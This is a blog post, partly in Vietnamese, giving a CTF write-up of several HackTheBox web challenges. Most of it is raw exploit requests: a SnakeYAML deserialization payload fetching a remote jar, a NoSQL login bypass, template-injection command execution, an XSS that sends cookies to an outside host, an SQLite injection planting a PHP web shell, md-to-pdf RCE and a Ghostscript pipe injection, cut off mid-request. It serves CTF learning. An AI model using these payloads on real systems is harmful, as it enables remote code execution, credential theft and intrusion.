@@ -1,0 +1,954 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>Htb web chall ctf 2024 - solved challenges - part 3 - Zoltán&#39;s Blog</title>
+  <meta name="description" content="Hack the box Watersnake POST /update HTTP/1.1Host: 83.136.255.222:50084User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.136.255.222:50084/update.htmlContent-Type: multipart/form-data; boundary=---------------------------56413677111823040781259599420Content-Length: 322Origin: http://83.136.255.222:50084Connection: closePriority: u=0-----------------------------56413677111823040781259599420Content-Disposition: form-data; name=&quot;config&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://0.tcp.ap.ngrok.io:11632/yaml-payload.jar&quot;]]]]-----------------------------56413677111823040781259599420--flag: HTB{sn4k3_y4ml_d3s3r14lized_ftw!}
+link: https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/ poc: https://github.com/artsploit/yaml-payload/tree/master
+Lazy Ballot Couch [No sqli]  async loginUser(username, password) {const options = {selector: {username: username,password: password,},};const resp = await this.">
+  <meta name="author" content="Zoltán Balogh"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "Zoltán\u0027s Blog",
+    
+    "url": "https:\/\/bzoltan1.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/bzoltan1.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/bzoltan1.github.io\/write-up\/2024-08-22-hackthebox-web-challpart3\/",
+          "name": "Htb web chall ctf 2024 solved challenges part 3"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "Htb web chall ctf 2024 - solved challenges - part 3",
+  "description" : "Hack the box Watersnake POST \/update HTTP\/1.1\rHost: 83.136.255.222:50084\rUser-Agent: Mozilla\/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko\/20100101 Firefox\/128.0\rAccept: *\/*\rAccept-Language: en-US,en;q=0.5\rAccept-Encoding: gzip, deflate, br\rReferer: http:\/\/83.136.255.222:50084\/update.html\rContent-Type: multipart\/form-data; boundary=---------------------------56413677111823040781259599420\rContent-Length: 322\rOrigin: http:\/\/83.136.255.222:50084\rConnection: close\rPriority: u=0\r-----------------------------56413677111823040781259599420\rContent-Disposition: form-data; name=\u0026quot;config\u0026quot;\r!!javax.script.ScriptEngineManager [\r!!java.net.URLClassLoader [[\r!!java.net.URL [\u0026quot;http:\/\/0.tcp.ap.ngrok.io:11632\/yaml-payload.jar\u0026quot;]\r]]\r]\r-----------------------------56413677111823040781259599420--\rflag: HTB{sn4k3_y4ml_d3s3r14lized_ftw!}\nlink: https:\/\/snyk.io\/blog\/unsafe-deserialization-snakeyaml-java-cve-2022-1471\/ poc: https:\/\/github.com\/artsploit\/yaml-payload\/tree\/master\nLazy Ballot Couch [No sqli]  async loginUser(username, password) {\rconst options = {\rselector: {\rusername: username,\rpassword: password,\r},\r};\rconst resp = await this.",
+  "inLanguage" : "en",
+  "wordCount":  1849 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/bzoltan1.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/bzoltan1.github.io\/write-up\/2024-08-22-hackthebox-web-challpart3\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/bzoltan1.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/bzoltan1.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="Htb web chall ctf 2024 - solved challenges - part 3" />
+<meta property="og:description" content="Hack the box Watersnake POST /update HTTP/1.1Host: 83.136.255.222:50084User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brReferer: http://83.136.255.222:50084/update.htmlContent-Type: multipart/form-data; boundary=---------------------------56413677111823040781259599420Content-Length: 322Origin: http://83.136.255.222:50084Connection: closePriority: u=0-----------------------------56413677111823040781259599420Content-Disposition: form-data; name=&quot;config&quot;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://0.tcp.ap.ngrok.io:11632/yaml-payload.jar&quot;]]]]-----------------------------56413677111823040781259599420--flag: HTB{sn4k3_y4ml_d3s3r14lized_ftw!}
+link: https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/ poc: https://github.com/artsploit/yaml-payload/tree/master
+Lazy Ballot Couch [No sqli]  async loginUser(username, password) {const options = {selector: {username: username,password: password,},};const resp = await this.">
+<meta property="og:image" content="https://bzoltan1.github.io/avatar.png" />
+<meta property="og:url" content="https://bzoltan1.github.io/write-up/2024-08-22-hackthebox-web-challpart3/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="Zoltán&#39;s Blog" />
+
+  <meta name="twitter:title" content="Htb web chall ctf 2024 - solved challenges - part 3" />
+  <meta name="twitter:description" content="Hack the box Watersnake POST /update HTTP/1.1Host: 83.136.255.222:50084User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0Accept: */*Accept-Language: …">
+  <meta name="twitter:image" content="https://bzoltan1.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://bzoltan1.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://bzoltan1.github.io/index.xml" type="application/rss+xml" title="Zoltán&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://bzoltan1.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/syntax.css" /><link rel="stylesheet" href="https://bzoltan1.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://bzoltan1.github.io/">Zoltán&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://bzoltan1.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://bzoltan1.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://bzoltan1.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://bzoltan1.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="Zoltán&#39;s Blog" href="https://bzoltan1.github.io/">
+            <img class="avatar-img" src="https://bzoltan1.github.io/avatar.png" alt="Zoltán&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>Htb web chall ctf 2024 - solved challenges - part 3</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="hack-the-box">Hack the box</h1>
+<h2 id="watersnake">Watersnake</h2>
+<p><img src="https://hackmd.io/_uploads/H1NMp5fuR.png" alt="image"></p>
+<pre><code>POST /update HTTP/1.1
+Host: 83.136.255.222:50084
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://83.136.255.222:50084/update.html
+Content-Type: multipart/form-data; boundary=---------------------------56413677111823040781259599420
+Content-Length: 322
+Origin: http://83.136.255.222:50084
+Connection: close
+Priority: u=0
+
+-----------------------------56413677111823040781259599420
+Content-Disposition: form-data; name=&quot;config&quot;
+
+!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://0.tcp.ap.ngrok.io:11632/yaml-payload.jar&quot;]
+  ]]
+]
+-----------------------------56413677111823040781259599420--
+
+</code></pre><p><img src="https://hackmd.io/_uploads/rkHoTqG_C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/B1QhacMdR.png" alt="image"></p>
+<p>flag: <code>HTB{sn4k3_y4ml_d3s3r14lized_ftw!}</code></p>
+<p>link: <a href="https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/">https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/</a>
+poc: <a href="https://github.com/artsploit/yaml-payload/tree/master">https://github.com/artsploit/yaml-payload/tree/master</a></p>
+<h2 id="lazy-ballot-couch-no-sqli">Lazy Ballot Couch [No sqli]</h2>
+<pre><code> async loginUser(username, password) {
+        const options = {
+            selector: {
+                username: username,
+                password: password,
+            },
+        };
+
+        const resp = await this.userdb.find(options);
+        if (resp.docs.length) return true;
+
+        return false;
+    }
+</code></pre><pre><code>POST /api/login HTTP/1.1
+Host: 94.237.59.199:46446
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.59.199:46446/login
+Content-Type: application/json
+Content-Length: 59
+Origin: http://94.237.59.199:46446
+Connection: close
+Cookie: connect.sid=s%3AFEy85rDbjlaB98jjRZg_434QpKF04wbu.YsZ6wi1WZit6HUvxSeo92fkdBT2KekP8X80%2FbprxZYA
+Priority: u=0
+
+{&quot;username&quot;:{
+&quot;$ne&quot;: null
+},&quot;password&quot;:{
+&quot;$ne&quot;: null
+}}
+</code></pre><p><img src="https://hackmd.io/_uploads/ryi5fsfu0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/Sy5jzjM_0.png" alt="image"></p>
+<p>flag : <code>HTB{c0rrupt3d_c0uch_b4ll0ts!}</code></p>
+<h2 id="neonify">Neonify</h2>
+<p><img src="https://hackmd.io/_uploads/ryg5Zfu_R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJPTbG_OC.png" alt="image"></p>
+<pre><code>POST / HTTP/1.1
+Host: 94.237.53.113:50183
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 28
+Origin: http://94.237.53.113:50183
+Connection: close
+Referer: http://94.237.53.113:50183/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+neon=1111%0a&lt;%25%3d+7*7+%25&gt;
+</code></pre><pre><code>POST / HTTP/1.1
+Host: 94.237.53.113:50183
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 31
+Origin: http://94.237.53.113:50183
+Connection: close
+Referer: http://94.237.53.113:50183/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+neon=1111%0a&lt;%25%3d+`ls+/`+%25&gt;
+</code></pre><p><img src="https://hackmd.io/_uploads/BkpzMG__C.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HkeSzGOdC.png" alt="image"></p>
+<pre><code>POST / HTTP/1.1
+Host: 94.237.53.113:50183
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+Origin: http://94.237.53.113:50183
+Connection: close
+Referer: http://94.237.53.113:50183/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+neon=1111%0a&lt;%25%3d+`cat%20flag.txt`+%25&gt;
+</code></pre><p>flag: <code>HTB{r3pl4c3m3n7_s3cur1ty}</code></p>
+<h2 id="kryptos-support">Kryptos Support</h2>
+<pre><code>
+POST /api/tickets/add HTTP/1.1
+Host: 94.237.58.3:54574
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.58.3:54574/
+Content-Type: application/json
+Content-Length: 91
+Origin: http://94.237.58.3:54574
+Connection: close
+Priority: u=0
+
+{&quot;message&quot;:&quot;&lt;script&gt;fetch('http://luhlr27z.requestrepo.com?a='+document.cookie);&lt;/script&gt;&quot;}
+</code></pre><p><img src="https://hackmd.io/_uploads/rkDeuXO_R.png" alt="image">
+<img src="https://hackmd.io/_uploads/SkCP_XuuR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/S1XzYmdO0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyzVYm_OA.png" alt="image"></p>
+<p>flag: <code>HTB{p0pp1ng_x55_4nd_id0rs_ftw!}</code></p>
+<h2 id="intergalactic-post">Intergalactic Post</h2>
+<ul>
+<li>Một chall với php và sqlite</li>
+</ul>
+<h3 id="analysis">analysis</h3>
+<pre><code>&lt;?php
+spl_autoload_register(function ($name){
+    if (preg_match('/Controller$/', $name))
+    {
+        $name = &quot;controllers/${name}&quot;;
+    }
+    else if (preg_match('/Model$/', $name))
+    {
+        $name = &quot;models/${name}&quot;;
+    }
+    include_once &quot;${name}.php&quot;;
+});
+
+
+$database = new Database('/tmp/challenge.db');
+
+$router = new Router();
+$router-&gt;new('GET', '/', 'IndexController@index');
+$router-&gt;new('POST', '/subscribe', 'SubsController@store');
+
+die($router-&gt;match());
+</code></pre><p>Như ta có thể thấy thì chall này có 2 api chính đó là GET / sẽ hiển thị trang chính index và POST /sybscribe sẽ gọi đến store trong SubsController</p>
+<pre><code>&lt;?php
+class SubscriberModel extends Model
+{
+
+    public function __construct()
+    {
+        parent::__construct();
+    }
+
+    public function getSubscriberIP(){
+        if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
+            return  $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];
+        }else if (array_key_exists('REMOTE_ADDR', $_SERVER)) {
+            return $_SERVER[&quot;REMOTE_ADDR&quot;];
+        }else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)) {
+            return $_SERVER[&quot;HTTP_CLIENT_IP&quot;];
+        }
+        return '';
+    }
+
+    public function subscribe($email)
+    {
+        $ip_address = $this-&gt;getSubscriberIP();
+        return $this-&gt;database-&gt;subscribeUser($ip_address, $email);
+    }
+}
+
+</code></pre><p>ở đây được khởi tạo một class với method getSubscriberIP sẽ lấy địa chỉ IP qua <code>X-Forwarded-For</code> hoặc địa chỉ ip thật của người dùng nếu không tồn tại header này.</p>
+<p>Thêm một method nữa là subscribe sẽ nhận đối số là email sau đó khởi tại ip_address bằng việc gọi method <code>getSubscriberIP</code> sau đó gọi đến method <code>subscribeUser($ip_address, $email)</code></p>
+<pre><code>public function subscribeUser($ip_address, $email)
+    {
+        return $this-&gt;db-&gt;exec(&quot;INSERT INTO subscribers (ip_address, email) VALUES('$ip_address', '$email')&quot;);
+    }
+</code></pre><p>Có thể thấy ở đây có thể bị sqli bằng việc cộng chuỗi, nhưng để ý vị trí của flag</p>
+<pre><code># Copy flag
+RUN RND=$(echo $RANDOM | md5sum | head -c 15) &amp;&amp; \
+	echo &quot;HTB{f4k3_fl4g_f0r_t3st1ng}&quot; &gt; /flag_${RND}.txt
+</code></pre><p>Vị trí của flag nằm ở /root cho nên mục tiêu của ta là RCE -&gt; may thay vẫn có payload stack query của sqlite</p>
+<p>Nguồn payload : <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---attach-database</a></p>
+<h3 id="exploit-local-server--real-server">Exploit local server + real server</h3>
+<p>Bởi vì docker build dùng bản php7 lỗi nên không test local được nên ta exploit server luôn</p>
+<pre><code>POST /subscribe HTTP/1.1
+Host: 83.136.249.33:39389
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 22
+X-Forwarded-For: lmaolmao','lmao@gmail.com');ATTACH DATABASE '/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES (&quot;&lt;?php system($_GET['cmd']); ?&gt;&quot;);-- 
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+email=lmao%40gmail.com
+</code></pre><p><img src="https://hackmd.io/_uploads/BkxveS29C.png" alt="image"></p>
+<p>flag: <code>HTB{inj3ct3d_th3_in3vit4bl3_tru7h}</code></p>
+<p>Note : Ngoài ra ta có thể bypass <code>if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) { header('Location: /?success=false&amp;msg=Please submit a valild email address!'); exit; }</code> để thực hiện SQLI cơ bản theo bài</p>
+<p><a href="https://github.com/Xib3rR4dAr/filter-var-sqli">https://github.com/Xib3rR4dAr/filter-var-sqli</a></p>
+<h2 id="blinkerfluids">BlinkerFluids</h2>
+<p>Một chall với nodejs + sqlite database + md-to-pdf để convert file markdown thành file pdf</p>
+<h3 id="analysis--detect">analysis + detect</h3>
+<p>Server chính có có 1 route nằm trong thư mục route làm nhieenmj vị chính của chương trình</p>
+<pre><code>
+// index.js
+const express      = require('express');
+const app          = express();
+const path         = require('path');
+const nunjucks     = require('nunjucks');
+const routes       = require('./routes/index.js');
+const Database     = require('./database');
+
+const db = new Database('invoice.db');
+
+app.use(express.json());
+app.disable('etag');
+
+nunjucks.configure('views', {
+	autoescape: true,
+	express: app
+});
+
+app.set('views', './views');
+app.use('/static', express.static(path.resolve('static')));
+
+app.use(routes(db));
+
+app.all('*', (req, res) =&gt; {
+	return res.status(404).send({
+		message: '404 page not found'
+	});
+});
+
+(async () =&gt; {
+	await db.connect();
+	await db.migrate();
+	app.listen(1337, '0.0.0.0', () =&gt; console.log('Listening on port 1337'));
+})();
+</code></pre><pre><code> //routes/index.js
+ 
+ 
+const express        = require('express');
+const router         = express.Router();
+const MDHelper       = require('../helpers/MDHelper.js');
+
+let db;
+
+const response = data =&gt; ({ message: data });
+
+router.get('/', async (req, res) =&gt; {
+    return res.render('index.html');
+});
+
+router.get('/api/invoice/list', async (req, res) =&gt; {
+	return db.listInvoices()
+		.then(invoices =&gt; {
+			res.json(invoices);
+		})
+		.catch(e =&gt; {
+			res.status(500).send(response('Something went wrong!'));
+		})
+});
+
+router.post('/api/invoice/add', async (req, res) =&gt; {
+    const { markdown_content } = req.body;
+
+    if (markdown_content) {
+        return MDHelper.makePDF(markdown_content)
+            .then(id =&gt; {
+                db.addInvoice(id)
+					.then(() =&gt; {
+						res.send(response('Invoice saved successfully!'));
+					})
+					.catch(e =&gt; {
+						res.send(response('Something went wrong!'));
+					})
+            })
+            .catch(e =&gt; {
+                console.log(e);
+                return res.status(500).send(response('Something went wrong!'));
+            })
+    }
+    return res.status(401).send(response('Missing required parameters!'));
+});
+
+router.post('/api/invoice/delete', async (req, res) =&gt; {
+	const { invoice_id } = req.body;
+
+	if (invoice_id) {
+		return db.deleteInvoice(invoice_id)
+		.then(() =&gt; {
+			res.send(response('Invoice removed successfully!'))
+		})
+		.catch(e =&gt; {
+			res.status(500).send(response('Something went wrong!'));
+		})
+	}
+
+	return res.status(401).send(response('Missing required parameters!'));
+});
+
+module.exports = database =&gt; {
+    db = database;
+    return router;
+};
+
+
+</code></pre><p>ở đây để ý có tổng cộng 4 api được cài đặt và export ra chương trình chính</p>
+<pre><code>
+router.get('/api/invoice/list', async (req, res) =&gt; {
+	return db.listInvoices()
+		.then(invoices =&gt; {
+			res.json(invoices);
+		})
+		.catch(e =&gt; {
+			res.status(500).send(response('Something went wrong!'));
+		})
+});
+
+</code></pre><p>api này đơn giản chỉ hiển thị các thông tin trong db <code>let stmt = await this.db.prepare('SELECT * FROM invoices order by id desc');</code></p>
+<pre><code>router.post('/api/invoice/delete', async (req, res) =&gt; {
+	const { invoice_id } = req.body;
+
+	if (invoice_id) {
+		return db.deleteInvoice(invoice_id)
+		.then(() =&gt; {
+			res.send(response('Invoice removed successfully!'))
+		})
+		.catch(e =&gt; {
+			res.status(500).send(response('Something went wrong!'));
+		})
+	}
+
+	return res.status(401).send(response('Missing required parameters!'));
+});
+
+</code></pre><p>api này thì để xóa của cái trên</p>
+<p>Để ý có một api duy nhất có xử lý nhiều ở đây đó là:</p>
+<pre><code>router.post('/api/invoice/add', async (req, res) =&gt; {
+    const { markdown_content } = req.body;
+
+    if (markdown_content) {
+        return MDHelper.makePDF(markdown_content)
+            .then(id =&gt; {
+                db.addInvoice(id)
+					.then(() =&gt; {
+						res.send(response('Invoice saved successfully!'));
+					})
+					.catch(e =&gt; {
+						res.send(response('Something went wrong!'));
+					})
+            })
+            .catch(e =&gt; {
+                console.log(e);
+                return res.status(500).send(response('Something went wrong!'));
+            })
+    }
+    return res.status(401).send(response('Missing required parameters!'));
+});
+</code></pre><p>Nó sẽ nhận một tham số là <code>markdown_content</code> tức là nội dung markdown ta muôn add sau đó nó gọi đến helper:</p>
+<pre><code>const { mdToPdf }    = require('md-to-pdf')
+const { v4: uuidv4 } = require('uuid')
+
+const makePDF = async (markdown) =&gt; {
+    return new Promise(async (resolve, reject) =&gt; {
+        id = uuidv4();
+        try {
+            await mdToPdf(
+                { content: markdown },
+                {
+                    dest: `static/invoices/${id}.pdf`,
+                    launch_options: { args: ['--no-sandbox', '--js-flags=--noexpose_wasm,--jitless'] } 
+                }
+            );
+            resolve(id);
+        } catch (e) {
+            reject(e);
+        }
+    });
+}
+
+module.exports = {
+    makePDF
+};
+</code></pre><p>ở đây ta để ý nó sử dụng module <code>mdToPdf</code> của thư viện <code>md-to-pdf</code> có version là <code>&quot;md-to-pdf&quot;: &quot;4.1.0&quot;</code> ní thực hiện convert file markdown sang pdf sau đó lưu lại ở static cuỗi cùng sẽ lưu id vào trong db.</p>
+<h3 id="remote-code-execution-rce-in-md-to-pdf-version-410">Remote Code Execution (RCE) in <code>md-to-pdf version 4.1.0</code></h3>
+<p>Khá dễ để tìm kiếm là nó dính rce ở phiên bản này:</p>
+<p>poc:</p>
+<p><img src="https://hackmd.io/_uploads/rkI_LBhcC.png" alt="image"></p>
+<h3 id="exploit">exploit</h3>
+<pre><code># Add flag
+COPY flag.txt /flag.txt
+
+</code></pre><p>flag nằm ở root nên chỉ cần cat và gửi ra ngoài ở đây mình cp ra static luôn</p>
+<p><img src="https://hackmd.io/_uploads/H1yHdBn90.png" alt="image"></p>
+<pre><code>POST /api/invoice/add HTTP/1.1
+Host: 94.237.49.212:37990
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.49.212:37990/
+Content-Type: application/json
+Content-Length: 116
+Origin: http://94.237.49.212:37990
+Connection: close
+Priority: u=0
+
+{&quot;markdown_content&quot;:&quot;---js\n((require(\&quot;child_process\&quot;)).execSync(\&quot;cp /flag.txt static/invoices/flag\&quot;))\n---RCE&quot;}
+</code></pre><p>flag: <code>HTB{int3rG4l4c7iC_r1d3_0n_bl1nk3r_flu1d5}</code></p>
+<h2 id="easterbunny">EasterBunny</h2>
+<h2 id="petpet-rcbee">petpet rcbee</h2>
+<pre><code>POST /api/upload HTTP/1.1
+Host: 94.237.59.63:54125
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: multipart/form-data; boundary=---------------------------31309964863637461648537953000
+Content-Length: 487
+Origin: http://94.237.59.63:54125
+Connection: close
+Referer: http://94.237.59.63:54125/
+Priority: u=0
+
+-----------------------------31309964863637461648537953000
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;ccc.jpg&quot;
+Content-Type: image/jpeg
+
+%!PS-Adobe-3.0 EPSF-3.0
+%%BoundingBox: -0 -0 100 100
+
+userdict /setpagedevice undef
+save
+legal
+{ null restore } stopped { pop } if
+{ legal } stopped { pop } if
+restore
+mark /OutputFile (%pipe%cat /app/flag &gt; /app/application/static/css/aaa) currentdevice putdeviceprops
+
